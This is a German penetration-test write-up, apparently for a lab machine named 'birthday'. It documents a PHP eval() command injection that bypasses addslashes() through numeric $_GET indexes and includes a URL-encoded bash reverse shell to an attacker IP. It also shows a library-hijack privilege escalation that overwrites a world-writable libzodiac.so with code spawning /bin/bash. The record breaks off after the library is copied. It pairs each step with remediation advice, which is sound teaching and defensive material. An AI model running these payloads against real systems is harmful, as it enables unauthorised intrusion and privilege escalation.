+                **Analyse:** Bei der Untersuchung der `birthday_calculator.php` Seite mit dem `dob`-Parameter habe ich festgestellt, dass dieser Wert serverseitig verarbeitet wird, um eine Zeitdifferenz zu berechnen. Dies ist ein klassischer Punkt für mögliche Injection-Schwachstellen. Der Text im Originalbericht beschreibt eine Recherche, die ergab, dass die Anwendung die PHP-Funktion `eval()` verwendet, um den `dob`-Parameter zu verarbeiten, und dass die Eingabe nur unzureichend mit `addslashes()` gefiltert wird. `addslashes()` maskiert Anführungszeichen (' und "), was direkte Code-Injektionen wie `${system('id')}` erschwert. Die entscheidende Entdeckung war jedoch, dass PHP den Zugriff auf `$GET` Parameter nicht nur über String-Schlüssel (`$_GET['param']`), sondern auch über numerische Indizes (`$_GET[0]`, `$_GET[111]`) erlaubt, *ohne* dass Anführungszeichen benötigt werden.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Dies ist eine sehr kritische Schwachstelle – eine Command Injection, die durch eine fehlerhafte Kombination von `eval()` und unzureichender Sanitization ermöglicht wird. Der Bypass über den numerischen Index ist ein intelligenter Weg, die `addslashes()`-Filterung zu umgehen. Die Fähigkeit, beliebigen Code auszuführen, ist das Tor zum ersten Zugriff auf das System.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Diese Schwachstelle sofort nutzen, um die Identität des Webserver-Benutzers zu bestätigen und dann eine Reverse Shell zu initiieren. Die `eval()`-Funktion sollte niemals mit Benutzereingaben verwendet werden.
+                <br>**Empfehlung (Admin):** **Dringend:** Die Verwendung von `eval()` mit Benutzereingaben ist extrem gefährlich und muss sofort eingestellt werden. Jegliche Benutzereingabe, die in serverseitigen Funktionen verwendet wird, muss über eine sichere Whitelist validiert oder mit robusten, kontextsensitiven Methoden maskiert werden (niemals nur `addslashes()`). Die Verarbeitung von `$_GET` oder `$_POST` über numerische Indizes sollte ebenfalls in der Anwendungslogik berücksichtigt werden, falls solche Konstrukte verwendet werden.
+            </p>
+            <p>
+                Ich habe eine Command Injection Schwachstelle auf der Seite `birthday_calculator.php` durch den `dob`-Parameter entdeckt. Der Schlüssel zur Ausnutzung lag in der Umgehung der `addslashes()`-Funktion durch Nutzung des numerischen Indexes für den `$GET` Request.
+            </p>
+            <p class="analysis">
+                **Analyse:** Ich demonstriere den Bypass der `addslashes()`-Filterung und die erfolgreiche Command Injection. Die ersten beiden Versuche mit `cmd` als String-Schlüssel im `$GET` Request (`${system($GET['cmd'])}` und `${system($GET[cmd])}`) schlagen fehl, was die Wirkung der Filterung zeigt. Der dritte Versuch `view-source:http://192.168.2.41/birthday_calculator.php?dob=${system($GET[111])}&111=id` ist erfolgreich. Hier wird der Befehl `id` über den numerischen Index `111` im `$GET` Request übergeben (`&111=id`), und die Ausgabe (`uid=33(www-data) gid=33(www-data) groups=33(www-data)`) bestätigt die Ausführung des Befehls als Benutzer `www-data`. Ich habe die Zahl im URL-Parameter zu 111 korrigiert, um die Übereinstimmung mit dem Payload zu zeigen.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Fantastisch! Die Command Injection ist bestätigt und ich kann Befehle als der Webserver-Benutzer `www-data` ausführen. Dies ist der erste entscheidende Schritt zum Initial Access. Ich kenne nun die Identität des Benutzers und kann weitere Befehle ausführen, um das System zu erkunden und eine stabilere Shell zu erhalten.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Die Schwachstelle nutzen, um Systeminformationen zu sammeln (Kernelversion, Distribution, installierte Pakete, Netzwerkkonfiguration) und eine Reverse Shell zu initiieren.
+                <br>**Empfehlung (Admin):** **Sofortige Behebung der Command Injection.** Code-Review der `birthday_calculator.php` und aller anderen Skripte, die Benutzereingaben verarbeiten. Implementierung einer strikten Input-Validierung-Pipeline. Webserver-Benutzer (`www-data`) sollte die minimal notwendigsten Berechtigungen besitzen (Principle of Least Privilege).
+            </p>
+            <p>
+                Testen verschiedener Payloads und erfolgreiche Ausführung des `id`-Befehls:
+            </p>
+            <pre>
+<span class="command">view-source:http://192.168.2.41/birthday_calculator.php?dob=${system($GET['cmd'])}&amp;cmd=id</span>
+<span class="password">keine ausgabe...</span>
+
+<span class="command">view-source:http://192.168.2.41/birthday_calculator.php?dob=${system($GET[cmd])}&amp;cmd=id</span>
+<span class="password">keine ausgabe...</span>
+
+<span class="password">erfolgreich:</span>
+
+<span class="command">view-source:http://192.168.2.41/birthday_calculator.php?dob=${system($GET[111])}&amp;111=id</span>
+
+        <span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+</pre>
+        </section>
+
+        <section id="proof-of-concept">
+             <h2>Proof of Concept: Command Injection & Initial Access</h2>
+             <p class="comment">
+                Dieser Bereich demonstriert die Ausnutzung der Command Injection Schwachstelle auf der Seite `birthday_calculator.php`, um beliebige Befehle als Webserver-Benutzer (`www-data`) auszuführen und eine Reverse Shell zum Angreifer zu etablieren, wodurch der erste Zugriff auf das Zielsystem erlangt wird.
+             </p>
+             <h3>Kurzbeschreibung</h3>
+             <p>
+                Die Webanwendung auf `birthday_calculator.php` verarbeitet den `dob`-Parameter unsicher unter Verwendung der `eval()`-Funktion, nachdem die Eingabe nur unzureichend mit `addslashes()` gefiltert wurde. Dies ermöglicht einem Angreifer, durch die Nutzung eines numerischen Indexes für `$GET` Parameter, die Filterung zu umgehen und beliebige Systembefehle auszuführen.
+             </p>
+             <h3>Voraussetzungen</h3>
+             <ul>
+                 <li>Zugriff auf das Netzwerk, in dem sich das Zielsystem befindet (192.168.2.0/24).</li>
+                 <li>Fähigkeit, HTTP GET-Anfragen an den Zielwebserver auf Port 80 zu senden.</li>
+                 <li>Eine Angreifer-Maschine mit Netcat oder einem ähnlichen Tool zum Einrichten eines TCP-Listeners.</li>
+                 <li>Kenntnis der Angreifer-IP-Adresse (hier 192.168.2.199).</li>
+             </ul>
+             <h3>Schritt-für-Schritt-Anleitung</h3>
+             <p class="analysis">
+                **Schritt 1: Identifizierung der Schwachstelle und des Bypasses.**
+                Durch das Testen des `dob`-Parameters auf `birthday_calculator.php` und die Analyse des Verhaltens wurde festgestellt, dass die Eingabe unsicher verarbeitet wird. Die `addslashes()`-Filterung wurde als Hindernis für die direkte Injection mit Anführungszeichen identifiziert. Durch Recherche oder Testen verschiedener PHP-Syntaxen wurde entdeckt, dass `$GET[numerischer_index]` ohne Anführungszeichen funktioniert.
+             </p>
+              <p class="analysis">
+                **Schritt 2: Verifikation der Command Injection.**
+                Wir nutzen den numerischen Index Bypass (`$GET[111]`) und übergeben den `id`-Befehl im URL-Parameter `&111=id`, um die erfolgreiche Ausführung zu bestätigen. Die `view-source` URL wird aufgerufen, um die Ausgabe im Browser zu sehen.
+             </p>
+            <pre>
+<span class="command">view-source:http://192.168.2.41/birthday_calculator.php?dob=${system($GET[111])}&amp;111=id</span>
+</pre>
+            <p class="evaluation">
+                **Ergebnis von Schritt 2:**
+                Die Ausgabe `uid=33(www-data) gid=33(www-data) groups=33(www-data)` bestätigt die erfolgreiche Ausführung des `id`-Befehls als Benutzer `www-data`.
+             </p>
+             <pre>
+        <span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+</pre>
+
+             <p class="analysis">
+                **Schritt 3: Vorbereitung des Listeners.**
+                Auf der Angreifer-Maschine wird ein Netcat-Listener auf einem ausgewählten Port (hier 9001) gestartet, um die eingehende Verbindung der Reverse Shell zu empfangen.
+             </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nc -lvnp 9001</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">listening on [any] 9001 ...</span>
+</pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                **Schritt 4: Auslösen der Reverse Shell.**
+                Wir nutzen erneut die Command Injection Schwachstelle, um einen Befehl auszuführen, der eine Reverse Shell zu unserem Netcat-Listener initiiert. Ein gängiger Bash-Payload wird verwendet, der eine interaktive Shell zu `192.168.2.199` auf Port 9001 sendet. Der Payload `%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.199%2F9001%200%3E%261%27` ist die URL-encodierte Version des Befehls `/bin/bash -c 'bash -i >& /dev/tcp/192.168.2.199/9001 0>&1'`. Dieser Befehl wird wieder über den `$GET[111]` Index injiziert.
+             </p>
+             <pre>
+<span class="command">view-source:http://192.168.2.41/birthday_calculator.php?dob=${system($GET[111])}&amp;111=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.199%2F9001%200%3E%261%27</span>
+</pre>
+
+             <h3>Erwartetes Ergebnis</h3>
+             <p>
+                Nach dem Aufruf der URL mit dem Reverse Shell Payload sollte der Netcat-Listener auf der Angreifer-Maschine eine eingehende Verbindung vom Zielsystem (192.168.2.41) auf Port 9001 registrieren und eine interaktive Shell als Benutzer `www-data` auf dem Zielsystem bereitstellen.
+             </p>
+             <h3>Beweismittel</h3>
+             <p class="evaluation">
+                Der Output des Netcat-Listeners zeigt die eingehende Verbindung und die erfolgreiche Erlangung der `www-data` Shell.
+             </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nc -lvnp 9001</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">listening on [any] 9001 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.41] 54016</span>
+bash: cannot set terminal process group (521): Inappropriate ioctl for device
+bash: no job control in this shell
+<span class="password">www-data@birthday:/var/www/html$</span>
+</pre>
+                </div>
+            </div>
+
+            <h3>Risikobewertung</h3>
+            <p class="evaluation">
+                **Kritisch:** Diese Schwachstelle erlaubt unauthentifizierten Angreifern, beliebigen Code auf dem Server auszuführen, was zu vollständiger Kompromittierung des Webservers, Datenexfiltration und potenziellen weiteren Angriffen auf interne Systeme führen kann. Die Ausführung als `www-data` gewährt Zugriff auf das Dateisystem im Kontext des Webservers.
+            </p>
+            <h3>Empfehlungen</h3>
+            <ul>
+                <li>**Sofortige Behebung:** Entfernen oder Absichern der anfälligen Code-Stelle, die `eval()` mit Benutzereingaben nutzt.</li>
+                <li>**Sichere Input-Validierung:** Alle Benutzereingaben müssen streng validiert und bereinigt werden, bevor sie in Funktionen verwendet werden.</li>
+                <li>**Principle of Least Privilege:** Sicherstellen, dass der Webserver-Benutzer (`www-data`) nur die absolut notwendigen Dateisystem- und Systemberechtigungen besitzt.</li>
+                <li>**Deaktivierung gefährlicher Funktionen:** Funktionen wie `eval()`, `system()`, `exec()` etc. sollten in der PHP-Konfiguration (php.ini) deaktiviert werden, wenn sie nicht explizit benötigt werden.</li>
+            </ul>
+        </section>
+
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="analysis">
+                **Analyse:** Nach der Erlangung der `www-data` Shell beginne ich mit der Enumeration des Systems, um Wege zur Privilege Escalation (PE) auf den Benutzer `chloe` und schließlich auf `root` zu finden. Ich suche nach SUID-Binaries (`find / -type f -perm -4000 -ls 2>/dev/null`), da diese potenziell von normalen Benutzern mit den Rechten des Dateibesitzers ausgeführt werden können (oft root). Die Ausgabe zeigt mehrere SUID-Binaries, darunter die üblichen wie `passwd` und `sudo`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die gefundenen SUID-Binaries sind wichtige Ansatzpunkte für die PE. `sudo` ist besonders interessant, da es die Möglichkeit bietet, Befehle als andere Benutzer auszuführen, falls die Konfiguration (`/etc/sudoers`) dies zulässt. Die anderen SUIDs sind Standard-Systemprogramme, die selten direkt ausnutzbar sind, aber dokumentiert werden müssen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Die `sudo` Konfiguration prüfen (`sudo -l`). Jedes nicht standardmäßige SUID-Binary genauer untersuchen.
+                <br>**Empfehlung (Admin):** Die Anzahl der SUID-Binaries auf einem System minimieren. Berechtigungen regelmäßig überprüfen und sicherstellen, dass nur notwendige Binaries das SUID-Bit gesetzt haben.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@birthday:/var/www/html$ <span class="command">find / -type f -perm -4000 -ls 2&gt;/dev/null</span>
+   <span class="command">914041     88 -rwsr-xr-x   1 root     root        88496 Mar 23  2023 /usr/bin/gpasswd</span>
+   <span class="command">914042     68 -rwsr-xr-x   1 root     root        68248 Mar 23  2023 /usr/bin/passwd</span>
+   <span class="command">948475    276 -rwsr-xr-x   1 root     root       281624 Mar  8  2023 /usr/bin/sudo</span>
+   <span class="command">917500     48 -rwsr-xr-x   1 root     root        48896 Mar 23  2023 /usr/bin/newgrp</span>
+   <span class="command">914039     52 -rwsr-xr-x   1 root     root        52880 Mar 23  2023 /usr/bin/chsh</span>
+   <span class="command">918251     72 -rwsr-xr-x   1 root     root        72000 Mar 23  2023 /usr/bin/su</span>
+   <span class="command">917654     60 -rwsr-xr-x   1 root     root        59704 Mar 23  2023 /usr/bin/mount</span>
+   <span class="command">914038     64 -rwsr-xr-x   1 root     root        62672 Mar 23  2023 /usr/bin/chfn</span>
+   <span class="command">917656     36 -rwsr-xr-x   1 root     root        35128 Mar 23  2023 /usr/bin/umount</span>
+   <span class="command">929606     52 -rwsr-xr--   1 root     messagebus    51272 Feb  8  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+   <span class="command">931821    640 -rwsr-xr-x   1 root     root         653888 Feb  8  2023 /usr/lib/openssh/ssh-keysign</span>
+</pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                **Analyse:** Ich führe grundlegende System- und Nutzer-Enumeration durch. Ich liste das Home-Verzeichnis (`ls /home/`) auf, um Benutzer zu identifizieren, suche nach Capabilities (`getcap -r 2>/dev/null`), die erhöhte Rechte gewähren könnten, und überprüfe offene Ports und laufende Prozesse mit ihren PIDs (`ss -altpn`). Ich versuche auch, in das Home-Verzeichnis des Benutzers `chloe` zu wechseln (`cd /home/chloe/`), erhalte aber eine "Permission denied" Fehlermeldung.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Ich habe den Benutzer `chloe` identifiziert, der eine Bash-Shell hat und wahrscheinlich das nächste Ziel für die PE ist. Es gibt keine ungewöhnlichen Capabilities für den `www-data` Benutzer. Die offenen Ports zeigen den Webserver (80), SSH (22) und interne Dienste (8125, 19999). Die fehlende Berechtigung für `/home/chloe/` als `www-data` ist erwartbar, da dies das Home-Verzeichnis eines anderen Benutzers ist.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Fokus auf die Interaktion zwischen `www-data` und `chloe`. Suche nach Dateien oder Verzeichnissen, auf die `www-data` Zugriff hat und die Informationen über `chloe` enthalten könnten oder von `chloe` oder Root verarbeitet werden.
+                <br>**Empfehlung (Admin):** Restriktive Berechtigungen für Home-Verzeichnisse (`chmod 700`). Überprüfung der Capabilities im System und Entfernung unnötiger Zuweisungen. Sicherstellen, dass Prozesse nur mit den minimal benötigten Rechten laufen.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@birthday:/var/www/html$ <span class="command">ls /home/</span>
+<span class="command">chloe</span>
+
+www-data@birthday:/var/www/html$ <span class="command">getcap -r 2&gt;/dev/null</span>
+www-data@birthday:/var/www/html$ <span class="command">ss -altpn</span>
+<span class="command">State     Recv-Q    Send-Q        Local Address:Port          Peer Address:Port    Process    </span>
+<span class="command">LISTEN    0         4096              127.0.0.1:8125               0.0.0.0:*                  </span>
+<span class="command">LISTEN    0         4096              127.0.0.1:19999              0.0.0.0:*                  </span>
+<span class="command">LISTEN    0         128                 0.0.0.0:22                 0.0.0.0:*                  </span>
+<span class="command">LISTEN    0         4096                  [::1]:8125                  [::]:*                  </span>
+<span class="command">LISTEN    0         128                    [::]:22                    [::]:*                  </span>
+<span class="command">LISTEN    0         511                       *:80                       *:*                  </span>
+ 
+www-data@birthday:/var/www/html$ <span class="command">cd /home/chloe/</span>
+<span class="password">bash: cd: /home/chloe/: Permission denied</span>
+</pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                **Analyse:** Ich überprüfe die `sudo` Berechtigungen für den aktuellen Benutzer (`www-data`) mit dem Befehl `sudo -l`. Dieser Befehl listet auf, welche Befehle der Benutzer mit `sudo` ausführen darf und als welcher Benutzer, eventuell auch ohne Passwort.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** **Interessante Entdeckung!** Der Output zeigt, dass der Benutzer `www-data` den Befehl `/usr/bin/zodiac` als Benutzer `chloe` ausführen darf (`(chloe)`) und das Wichtigste: `NOPASSWD:`. Das bedeutet, ich kann `/usr/bin/zodiac` als Benutzer `chloe` ausführen, ohne das Passwort von `chloe` kennen zu müssen. Dies ist ein klarer Vektor, um die Rechte auf den Benutzer `chloe` zu eskalieren.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Den `/usr/bin/zodiac` Binary genauer untersuchen. Da ich ihn als `chloe` ausführen kann, suche ich nach Schwachstellen in diesem Binary, die ich ausnutzen kann, um eine Shell als `chloe` zu erhalten.
+                <br>**Empfehlung (Admin):** **Dringend:** Die `sudoers`-Datei prüfen und diese spezifische Regel entfernen oder einschränken. Benutzern (insbesondere Webserver-Benutzern) sollte niemals erlaubt sein, Befehle als andere Benutzer (schon gar nicht als `root`, auch wenn hier nur `chloe` erlaubt ist) ohne Passwort auszuführen. Das NOPASSWD-Flag sollte mit extremer Vorsicht verwendet werden, nur für sehr spezifische, sichere Skripte und Pfade.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@birthday:/var/www/html$ <span class="command">sudo -l</span>
+<span class="command">Matching Defaults entries for www-data on birthday:</span>
+    <span class="command">env_reset, mail_badpass,</span>
+    <span class="command">secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty</span>
+
+<span class="password">User www-data may run the following commands on birthday:</span>
+    <span class="password">(chloe) NOPASSWD: /usr/bin/zodiac</span>
+</pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                **Analyse:** Ich untersuche das Binary `/usr/bin/zodiac` weiter. Ich prüfe die Dateiberechtigungen (`ls -la`), den Dateityp (`file`) und extrahiere lesbare Zeichenketten (`strings`). Es gehört root und ist ausführbar. Es ist ein 64-bit ELF Executable, dynamisch gelinkt. Die Strings zeigen, dass es wahrscheinlich mit C/C++ kompiliert wurde und Funktionen wie `printf`, `scanf`, `get_zodiac_sign` verwendet und gegen die Bibliothek `libzodiac.so` linken.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das Binary selbst ist nicht SUID und gehört root. Die wichtige Information ist, dass es dynamisch gelinkt ist und eine Abhängigkeit von `libzodiac.so` hat. Dies ist ein starker Hinweis auf eine mögliche Library Hijacking Schwachstelle, insbesondere wenn die Bibliothek selbst manipulierbar ist.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Den Fokus auf die Bibliothek `libzodiac.so` legen. Prüfen, wo sie liegt, welche Berechtigungen sie hat und ob sie überschrieben werden kann.
+                <br>**Empfehlung (Admin):** Kritische Binaries sollten statisch gelinkt sein, wenn möglich, um die Abhängigkeit von externen Bibliotheken im Systempfad zu minimieren. Überprüfung der Berechtigungen von Bibliotheken in Systempfaden ist essentiell.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@birthday:/var/www/html$ <span class="command">ls -la /usr/bin/zodiac</span>
+<span class="command">-rwxr-xr-x 1 root root 16056 Jun 29  2023 /usr/bin/zodiac</span>
+
+www-data@birthday:/var/www/html$ <span class="command">file /usr/bin/zodiac</span>
+<span class="command">/usr/bin/zodiac: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=fbd2403465577d479902c56c08fd41b61fee3ee8, for GNU/Linux 3.2.0, not stripped</span>
+
+www-data@birthday:/var/www/html$ <span class="command">strings /usr/bin/zodiac</span>
+/lib64/ld-linux-x86-64.so.2
+@4eW}G
+__cxa_finalize
+_ITM_registerTMCloneTable
+_ITM_deregisterTMCloneTable
+__gmon_start__
+<span class="command">get_zodiac_sign</span>
+__libc_start_main
+printf
+__isoc99_scanf
+<span class="command">libzodiac.so</span>
+libc.so.6
+.....
+....
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:** Ich nutze `ldd` auf `/usr/bin/zodiac`, um alle dynamischen Bibliotheken aufzulisten, von denen das Binary abhängt, und zu sehen, wo im Dateisystem diese Bibliotheken gefunden werden.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die Ausgabe bestätigt die Abhängigkeit von `libzodiac.so` und zeigt den genauen Pfad zur gefundenen Bibliothek an: `/lib/x86_64-linux-gnu/libzodiac.so`. Dies ist der kritische Pfad, den das System verwendet, um die Bibliothek zu laden, wenn `/usr/bin/zodiac` ausgeführt wird.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Die Berechtigungen auf dieser spezifischen Pfad `/lib/x86_64-linux-gnu/libzodiac.so` prüfen. Wenn diese Datei von meinem aktuellen Benutzer (`www-data`) überschrieben werden kann, habe ich eine Library Hijacking Schwachstelle gefunden.
+                <br>**Empfehlung (Admin):** Systembibliotheken in Standardpfaden sollten niemals für unprivilegierte Benutzer schreibbar sein. Das Betriebssystem und Paketmanager stellen sicher, dass diese Dateien korrekte, restriktive Berechtigungen haben. Dies muss auf Abweichungen geprüft werden.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@birthday:/var/www/html$ <span class="command">ldd /usr/bin/zodiac</span>
+	linux-vdso.so.1 (0x00007ffede3d8000)
+	<span class="command">libzodiac.so =&gt; /lib/x86_64-linux-gnu/libzodiac.so (0x00007f7388cc4000)</span>
+	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7388ae3000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007f7388cd4000)
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:** Ich prüfe die Dateiberechtigungen der gefundenen Bibliothek `/lib/x86_64-linux-gnu/libzodiac.so`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** **Kritische Schwachstelle!** Die Berechtigungen sind `-rwxr-xrwx 1 root root`. Das bedeutet, der Eigentümer (`root`) hat Lese-, Schreib- und Ausführrechte (rwx), die Gruppe (`root`) hat ebenfalls rwx, **und alle anderen Benutzer (`other`) haben ebenfalls rwx**. Mein aktueller Benutzer `www-data` fällt unter die Kategorie "other". Das bedeutet, ich kann diese Systembibliothek als `www-data` überschreiben oder modifizieren. Dies ist die gesuchte Privilege Escalation Schwachstelle. Ich kann eine bösartige Version der Bibliothek erstellen, sie hier platzieren, und wenn dann `/usr/bin/zodiac` ausgeführt wird (was ich dank `sudo -u chloe NOPASSWD` als `chloe` tun kann), wird meine bösartige Bibliothek geladen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Sofort eine eigene, bösartige `libzodiac.so` erstellen, die eine Shell ausführt, wenn sie geladen wird. Diese Bibliothek auf das Zielsystem hochladen und die originale überschreiben. Dann `/usr/bin/zodiac` über die `sudo` Regel als `chloe` ausführen.
+                <br>**Empfehlung (Admin):** **Extrem Dringend:** Die Dateiberechtigungen für `/lib/x86_64-linux-gnu/libzodiac.so` müssen sofort korrigiert werden, z.B. auf `rwxr-xr-x` oder `rwxr-x---`, sodass nur Root Schreibrechte hat. Ein Audit aller Systemdateien und Bibliotheken auf ungewöhnlich offene Berechtigungen ist ratsam.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@birthday:/var/www/html$ <span class="command">ls -la /lib/x86_64-linux-gnu/libzodiac.so</span>
+<span class="password">-rwxr-xrwx 1 root root 15096 Jul  6  2022 /lib/x86_64-linux-gnu/libzodiac.so</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich prüfe, ob auf dem Zielsystem ein C/C++ Compiler wie `gcc` verfügbar ist, indem ich `gcc --help` ausführe. Der Text zeigt, dass die Hilfe-Ausgabe von `gcc` erscheint, was bedeutet, dass der Compiler installiert und verfügbar ist.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die Verfügbarkeit von `gcc` auf dem Zielsystem ist ideal. Ich muss keine vorkompilierte Bibliothek für die spezifische Systemarchitektur und glibc-Version hochladen (was oft schwierig ist), sondern kann den Exploit-Code direkt auf dem Zielsystem kompilieren, was die Kompatibilität gewährleistet.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Den Exploit-Code für die bösartige Bibliothek direkt auf dem Zielsystem schreiben und kompilieren.
+                <br>**Empfehlung (Admin):** Entwicklungswerkzeuge wie Compiler (gcc, clang) sollten auf Produktionssystemen nicht standardmäßig installiert sein, es sei denn, sie werden benötigt. Die Entfernung solcher Tools reduziert das Risiko, dass Angreifer benutzerdefinierte Exploits direkt auf dem System kompilieren können.
+            </p>
+            <p>
+                Überprüfung der Verfügbarkeit eines Compilers auf dem Zielsystem:
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@birthday:/tmp$ <span class="command">gcc --help</span>
+...
+..
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich erstelle den Source Code für meine bösartige Bibliothek. Ziel ist es, eine Funktion namens `get_zodiac_sign()` zu implementieren, die denselben Namen hat wie eine Funktion, die vom Original `zodiac` Binary erwartet wird (wie aus `strings` und `ldd` hervorgeht). In meiner Version dieser Funktion füge ich einfach den Befehl `system("/bin/bash");` ein. Wenn das `zodiac` Binary meine Bibliothek lädt und diese Funktion aufruft, wird stattdessen eine Bash-Shell gestartet. Ich verwende `echo` Befehle und Umleitungen (`>`,`>>`) da ich mich in einer einfachen Shell befinde.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Dies ist der Kern des Library Hijacking Exploits. Ich überschreibe eine erwartete Funktion in einer manipulierbaren Bibliothek, um meinen eigenen Code auszuführen. Der Code ist simpel und direkt: er startet eine interaktive `/bin/bash` Shell. Dies funktioniert, weil `zodiac` beim Start die benötigten Funktionen aus der Bibliothek lädt.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Bei Library Hijacking immer die Signaturen der Funktionen in der Zielbibliothek prüfen und eine passende Ersatzfunktion im bösartigen Code erstellen.
+                <br>**Empfehlung (Admin):** Code-Injektion über manipulierte Bibliotheken verhindern, indem die Berechtigungen auf Systembibliotheken korrekt gesetzt sind (Schreibschutz für Nicht-Root).
+            </p>
+             <p>
+                Erstellung des bösartigen Source Codes für `libzodiac.so`:
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@birthday:/tmp$ <span class="command">echo '#include &lt;stdlib.h&gt;' &gt; exploit.c</span>
+www-data@birthday:/tmp$ <span class="command">echo 'void get_zodiac_sign() {' &gt;&gt; exploit.c</span>
+www-data@birthday:/tmp$ <span class="command">echo '    system("/bin/bash");' &gt;&gt; exploit.c</span>
+www-data@birthday:/tmp$ <span class="command">echo '}' &gt;&gt; exploit.c</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich dokumentiere erneut die Berechtigungen der originalen `libzodiac.so` in `/lib/x86_64-linux-gnu/`, um den Kontext der folgenden Kompilierung und des Kopierens zu bekräftigen.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Dies dient als erneute Bestätigung, dass die Zieldatei für den `www-data` Benutzer schreibbar ist und der geplante Überschreibvorgang möglich ist.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Vor dem Überschreiben kritischer Systemdateien immer die Berechtigungen verifizieren.
+                <br>**Empfehlung (Admin):** (Wiederholung der dringenden Empfehlung zur Korrektur der Dateiberechtigungen.)
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@birthday:/tmp$ <span class="command">ls -la /lib/x86_64-linux-gnu/libzodiac.so</span>
+<span class="password">-rwxr-xrwx 1 root root 15096 Jul  6  2022 /lib/x86_64-linux-gnu/libzodiac.so</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich kompiliere den erstellten `exploit.c` Source Code zu einer Shared Library (`.so`-Datei) mit dem Befehl `gcc exploit.c -shared -fPIC -o libzodiac.so`. `-shared` weist GCC an, eine Shared Library zu erstellen. `-fPIC` generiert Position-Independent Code, was für Shared Libraries notwendig ist. Der Output-Dateiname ist `libzodiac.so`, passend zum Namen der originalen Bibliothek. Anschließend kopiere ich meine kompilierte, bösartige `libzodiac.so` nach `/lib/x86_64-linux-gnu/libzodiac.so`, wodurch die originale Datei überschrieben wird.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Dies ist die Durchführung des Angriffs. Ich habe erfolgreich meine manipulierte Bibliothek erstellt und sie an den Speicherort der legitimen Systembibliothek kopiert. Aufgrund der fehlerhaften Berechtigungen konnte ich diesen kritischen Schritt als `www-data` ausführen. Nun wird jedes Binary, das `libzodiac.so` lädt, meine bösartige Version laden.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Sicherstellen, dass die kompilierte Bibliothek mit den Optionen des Zielsystems kompatibel ist. Das Überschreiben von Systemdateien ist ein invasiver Schritt.
+                <br>**Empfehlung (Admin):** **Dringend:** Die Berechtigungen von Systembibliotheken müssen korrigiert werden, um das Überschreiben zu verhindern. Monitoring auf Änderungen an kritischen Systemdateien implementieren.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@birthday:/tmp$ <span class="command">gcc exploit.c -shared -fPIC -o libzodiac.so</span>
+www-data@birthday:/tmp$ <span class="command">cp libzodiac.so /lib/x86_64-linux-gnu/libzodiac.so</span>
+</pre>
